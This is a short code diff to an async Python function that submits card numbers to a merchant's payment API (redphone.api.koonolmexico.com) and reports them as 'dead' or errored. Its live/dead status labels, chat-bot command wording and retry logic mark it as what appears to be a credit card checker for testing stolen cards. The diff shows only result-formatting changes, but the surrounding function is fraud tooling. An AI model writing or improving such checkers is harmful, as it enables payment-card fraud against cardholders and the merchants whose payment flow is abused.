@@ -318,7 +318,9 @@ async def process_card(card: str) -> str:
                 tokenst = responsePm["id"]
                 print(tokenst)
             else:
-                return "❌ Usa otra tarjeta o comando"
+                mensaje = f"Tarjeta rechazada:"
+                status = "dead"
+                return {"status": status, "message": mensaje, "cc": card}
 
             headers = {
                 'authority': 'redphone.api.koonolmexico.com',
@@ -407,4 +409,5 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
